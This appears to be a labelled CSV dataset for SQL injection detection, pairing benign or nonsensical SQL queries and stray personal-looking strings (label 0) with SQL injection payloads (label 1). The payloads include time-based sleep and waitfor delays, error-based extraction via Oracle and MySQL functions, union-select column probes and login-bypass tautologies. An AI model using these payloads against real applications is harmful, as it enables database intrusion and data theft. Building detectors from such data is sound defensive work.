Query,Label
DELETE FROM string,0
SELECT * FROM alike WHERE broke = 'satellites' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",1
SELECT bow ( s FROM doubt RIGHT JOIN,0
revivificar,0
"  SELECT * FROM tell WHERE your IN  ( 'faster', 'on', 'are' )  ",0
SELECT * FROM card WHERE library = 'share'  OR himself = 'course',0
SELECT why ( s )  FROM just FULL OUTER JOIN,0
"1   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",1
"  SELECT peace AS belt, today AS [leather]  FROM begun",0
heile,0
SELECT * FROM equally WHERE fur NOT LIKE 'were%',0
SELECT AVG ( blow ) FROM pole,0
SELECT * FROM claws WHERE room  BETWEEN 10 AND 20,0
SELECT * FROM route ORDER BY he,0
-9622'   )    )     )   order by 1#,1
9.66866E+15,0
"1 where 9869  =  9869 union all select null,null#",1
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20,0
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1
6i4t562e7a,0
"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM might WHERE against = 'wolf'  AND City = 'brave',0
SELECT * FROM traffic 3,0
soldani-godet@informex.ru,0
tchjan-lian.quadflieg@comerciosdeaspe.se,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
1   )    )    as eigk where 2557  =  2557,1
SELECT plate FROM ability UNION ALL SELECT canal FROM sum ORDER BY slip,0
SELECT knowledge FROM fog UNION ALL SELECT column FROM bowl ORDER BY wing,0
SELECT AVG ( theory ) FROM none,0
SELECT AVG ( pocket ) FROM air SELECT SUM ( complete ) ,0
SELECT * FROM children WHERE active = 'quiet' FETCH FIRST 3 ROWS ONLY,0
"  SELECT after,instance FROM cheese WHERE wise = 'wall' UNION SELECT consonant, cave FROM plane",0
"admin"" or 1  =  1--",1
"1""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT news ( s )  FROM seven,0
1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,1
"   SELECT low,bound,develop,kill,older     (  (  string JOIN beyond ON youth.speed =  studying.bend )   INNER JOIN masterON Orders.feel =  greatly.trackID ) ",0
"  SELECT gas,tree FROM review WHERE question = 'today' UNION SELECT old, charge FROM average",0
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'qutm'  =  'qutm",1
"-6629%""   )    )     )   or 8571  =  8571--",1
04146926a,0
armero filippi,0
"   SELECT again, final, never FROM disease WHERE fat  IS NULL",0
"   SELECT addition, after+ ', ' + behavior+ ' ' + cloth+ ', ' + line AS length  FROM daughter",0
"-5643'   )    )    union all select 1515,1515#",1
"""-""",1
SELECT * FROM final WHERE task BETWEEN '1996-07-01' AND '1996-07-31',0
"INSERT INTO teeth ( blue, weak, coal, missing, easily, coal )  VALUES  ( 'water', 'like'. herd', 'pan', 'block', 'trip', 'forgotten' )  ",0
 UPDATE refused SET dance = 'job'WHERE worth = 'sister',0
"INSERT INTO chicken ( belt, bad, guess, perhaps, girl, part )  VALUES  ( 'feature', 'hidden'. surprise', 'shown', 'wind', 'minute', 'bet' )  ",0
42569454l,0
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1
"1""  )   as ebvt where 5305  =  5305",1
DELETE FROM solution,0
ibazeta montells,0
"   SELECT COUNT ( chamber ) , stock FROM know BY congress",0
SELECT heard FROM single UNION ALL SELECT vapor FROM tail ORDER BY solution,0
"1   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  6312  =  6312",1
select * from users where id  =  1.<@. or 1  =  1 -- 1,1
"   SELECT Employees.regular, COUNT ( Orders.mountainID )  AS flagFROM    ( OrdersINNER JOIN lips ON Orders.gladID  =  Employees.plusID ) ",0
bette,0
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
SELECT AVG ( number ) FROM draw SELECT SUM ( sound ) ,0
soule terraza,0
avda. fernando ferrerio s/n,0
select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,1
"antelo y mario, 192,",0
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_tax_settings' LIMIT 1,0
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,1
" SELECT column_name ( s )  FROM outside,inch",0
1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
SELECT * FROM bread,0
5.181E+15,0
SELECT vote FROM strange,0
22120,0
"1  )   where 9645  =  9645 union all select null,null,null--",1
select   (  case when   (  8234  =  2498  )   then 8234 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1
1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,1
verghese,0
1  )   where 2543  =  2543,1
-8745'  )   as xpwv where 8855  =  8855 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,1
SELECT TOP 3 * FROM rapidly SELECT * FROM practical 3SELECT * FROM during,0
 UPDATE collect SET couple = 'battle'WHERE bigger = 'earth',0
"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1
84996241v,0
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
plaa caudillo 60,0
17151,0
@var select @var as var into temp end --,1
1'+  (  select gqez where 3704  =  3704,1
ivonne,0
 UPDATE seems SET some = 'flag'WHERE son = 'distant',0
SELECT * FROM hill WHERE    NOT beyond = 'great',0
x' and userid is NULL; --,1
av. vigo 144 2?h,0
SELECT COUNT ( DISTINCT last )  FROM simple,0
60578448j,0
bordagorry,0
64446970g,0
xaudiera alicea,0
SELECT * FROM halfway FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
"c/ el columpio 13,",0
1  )   where 8041  =  8041,1
SELECT TOP 50 PERCENT * FROM college SELECT * FROM alone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM jet,0
"1'  )   and make_set  (  9961  =  6559,6559  )   and   (  'exde'  =  'exde",1
SELECT COUNT ( cuttingID ) FROM way,0
SELECT * FROM satellites WHERE studied = 'but'  OR syllable = 'film',0
"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""frgb"" like ""frgb",1
37795,0
"  SELECT hot,valley FROM voyage WHERE north = 'smallest' UNION SELECT direct, hurried FROM rough",0
SELECT * FROM quiet WHERE arm = 'detail'  AND  ( fellow = 'service' OR cloud = 'flew' ) ,0
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",1
4a2ho4a2o,0
SELECT column_name ( s )  FROM table2; SELECT City FROM Customers,0
SELECT COUNT ( DISTINCT hardly )  FROM rabbit,0
SELECT extra ( s )  FROM have UNION ALL,0
"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9347 )  ORDER BY meta_id ASC",0
-9708' where 8150  =  8150 or 6872  =  6872--,1
SELECT TOP 3 * FROM ear SELECT * FROM about 3SELECT * FROM badly,0
" select * from users where id  =  1 union select @ $$,version  (    )   -- 1",1
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
SELECT orbit ( s )  FROM orange FULL OUTER JOIN,0
castelln de la plana/castell de la plana,0
"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1
14li6l4,0
dormer,0
2.61077E+15,0
6.80379E+15,0
"1""  )   where 7548  =  7548",1
SELECT MIN ( deeply )  AS speak FROM lion,0
SELECT AVG ( motor ) FROM explore,0
SELECT Count ( * )  AS season,0
"carretera ribas matama 160,",0
SELECT * FROM lesson WHERE return NOT BETWEEN 'bright' AND 'beginning',0
 or 1  =  1,1
"  SELECT MAKETIME ( 838,   59, 59 ) ;",0
1'||  (  select 'bzxa' where 6320  =  6320,1
"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
SELECT * FROM poem WHERE NOT donkey = 'heading'  AND NOT salmon = 'everywhere',0
SELECT COUNT ( in ) FROM lovely,0
SELECT AVG ( kind )  FROM strike  SELECT SUM ( cookies ) ,0
crcova valentini,0
"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM good WHERE real IN  ( SELECT simply FROM introduced ) ,0
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",1
"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select   (  case when   (  3499  =  4209  )   then 3499 else 3499*  (  select 3499 from mysql.db  )   end  )  #,1
SELECT * FROM color,0
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
vilalba sasserra,0
"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--",1
"1   )    )    union all select null,null,null,null#",1
SELECT * FROM  ( SELECT wrapped FROM green ) ,0
"  SELECT * FROM race WHERE large IN  ( 'come', 'adjective', 'successful' )  ",0
SELECT * FROM grown WHERE automobile = 'milk'  OR control = 'wild',0
"  SELECT Orders.sayrID, Employees.rose, Employees.steep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.foxID ORDER BY Orders.climateID",0
hallenbe,0
SELECT * FROM telephone,0
"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",1
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1
jandtegui curell,0
-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT * FROM come 3 SELECT * FROM coffee,0
SELECT * FROM wide WHERE upward NOT LIKE '[deep]%',0
"-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
tuneu,0
"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1
arima@hormigon-impreso.nu,0
"  SELECT * FROM hospital WHERE girl IN  ( 'however', 'most', 'milk' )  ",0
SELECT thrown ( s ) FROM motion INNER JOIN,0
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1
SELECT * FROM whole WHERE essential BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( featureID ) FROM jar,0
bollullos de la mitacin,0
4644,0
tinajas,0
charlebois3@nanotecnologo.np,0
SELECT * FROM division,0
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',0
SELECT species ( s )  FROM lamp SELECT numeral ( s ) ,0
 ( ,1
SELECT * FROM seldom WHERE spell = 'noted',0
valdelinares,0
SELECT * FROM bag WHERE should = 'bar'  OR lower = 'difference',0
SELECT TOP 3 * FROM chart WHERE can = 'west',0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
5.82525E+15,0
"1'  )   as idqc where 5288  =  5288 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"1%""   )    )    and 7358  =  6986--",1
SELECT AVG ( comfortable ) FROM health,0
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""kins""  =  ""kins",1
SELECT * FROM foreign,0
"   SELECT boy, sky+ ', ' + send+ ' ' + label+ ', ' + speed AS image  FROM birthday",0
1  )   as tbve where 4828  =  4828,1
"1' union all select null,null,null,null,null--",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127",1
DELETE FROM think,0
1  )   as uhmm where 2304  =  2304 union all select null#,1
"passatge badal, 31,",0
duffield@telelujo.coop,0
SELECT storm ( s )  FROM might UNION ALL,0
"  SELECT arrangement,worse FROM soft WHERE wrong = 'wet' UNION SELECT rubbed, appearance FROM through",0
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""exgr"" like ""exgr",1
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'pcim'  =  'pcim",1
-3084%'   )    )    order by 1--,1
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM catch,0
"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",1
"1,  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",1
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
"-7255' union all select 2127,2127,2127,2127,2127#",1
admin' or '1'  =  '1'/*,1
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""fvtu"" like ""fvtu",1
queral queral,0
SELECT * FROM money FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest,0
mehd3,0
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1
1  )   or sleep  (  5  )  #,1
SELECT * FROM should WHERE rear = 'divide',0
PRINT,1
9629,0
coe,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",1
"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
SELECT * FROM thought 3,0
cousinea,0
-4104%' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',1
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,0
"   SELECT night,fireplace,garage,toy,chain     (  (  hill JOIN old ON thick.row =  pull.stock )   INNER JOIN governmentON Orders.pig =  layers.immediatelyID ) ",0
hymen_israeli@aulahost.vc,0
SELECT * FROM station WHERE invented = 'worry'  AND City = 'meant',0
 or true--,1
SELECT * FROM vowel WHERE test BETWEEN 'additional' AND 'won',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28549 )  ORDER BY meta_id ASC",0
alcacil,0
SELECT * FROM split WHERE letter = 'fur'  OR applied = 'most',0
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,1
SELECT top FROM older UNION SELECT married FROM way ORDER BY airplane,0
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'ejnt' like 'ejnt,1
"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",1
metrorragia,0
condal talero,0
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11406 )  ORDER BY meta_id ASC",0
youji,0
SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) ,0
"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
1972,0
"SELECT ATAN2 ( -0.8, 2 ) ;",0
dido,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
2.97648E+15,0
"-5776%' union all select 3075,3075,3075,3075,3075--",1
"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",1
urkiaga,0
telsfora,0
1'   )    )    as zqeg where 4729  =  4729 and   (  1098  =  9682  )  *9682--,1
SELECT itself ( s ) FROM knife INNER JOIN,0
SELECT * FROM which WHERE glass = 'saw' FETCH FIRST 3 ROWS ONLY,0
berber,0
 (  select   (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3287  =  3287  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
SELECT troops ( s )  FROM nation SELECT blue FROM wise,0
"-5150   )    )     )   union all select 5660,5660,5660#",1
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1
SELECT AVG ( Price ) FROM egg,0
SELECT COUNT ( forget ) FROM husband,0
SELECT * FROM foot  WHERE lion = joined,0
SELECT * FROM wool WHERE protection  BETWEEN 10 AND 20,0
norton@lesionesmusculares.uz,0
SELECT AVG ( choose ) FROM tube SELECT SUM ( judge ) ,0
69346006v,0
SELECT smile FROM river,0
5215,0
-',1
"  SELECT ISNULL ( ""Hello world!"" ) ;",0
"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",1
hemisfero,0
"1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",1
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1
SELECT AVG ( mile ) FROM outer SELECT SUM ( fight ) ,0
ibarra,0
SELECT TOP 3 * FROM race,0
" SELECT * FROM machine ORDER BY range, eight",0
50645313a,0
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1
yong-gomori@andrestabernero.gg,0
c4nt0rn,0
"1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1
"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",1
"1"" where 8732  =  8732",1
"  SELECT * FROM drove WHERE dark NOT IN  ( 'younger', 'swung', 'term' )  ",0
calle juan agui 97 9-e,0
1   )    )    order by 1#,1
rattanap,0
SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM individual WHERE    NOT post = 'horn',0
"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
sappington-espana@fighting-machines.mq,0
SELECT cloth FROM worry UNION SELECT certain FROM wooden ORDER BY young,0
"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1
"1' and elt  (  2266  =  7467,7467  )  ",1
de4f1g6raci4,0
"INSERT INTO correctly  ( even, children, square )  VALUES  ( 'laid', 'have', 'basic' )  ",0
SELECT AVG ( week ) FROM against SELECT SUM ( mouse ) ,0
"INSERT INTO page  ( flew, reach, printed )  VALUES  ( 'baby', 'bush', 'unhappy' )  ",0
SELECT * FROM attack WHERE unless = 'task' LIMIT 3,0
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM me WHERE birds = 'silk'  OR experience = 'neighborhood',0
84411118z,0
"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",1
"-4025"" or 3038  =  3038",1
"  SELECT mindID AS ID, burst AS grade FROM stock",0
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1
 UPDATE moment SET sell = 'lay'WHERE trick = 'managed',0
SELECT * FROM vertical  WHERE mix NOT LIKE '[grown]%',0
1272,0
10263,0
" SELECT * FROM threw ORDER BY stood, manner",0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki",1
SELECT MIN ( definition )  AS heard FROM facing,0
SELECT AVG ( merely ) FROM until SELECT SUM ( give ) ,0
descrieres@enibiza.com.ac,0
SELECT * FROM lovely FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1
"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
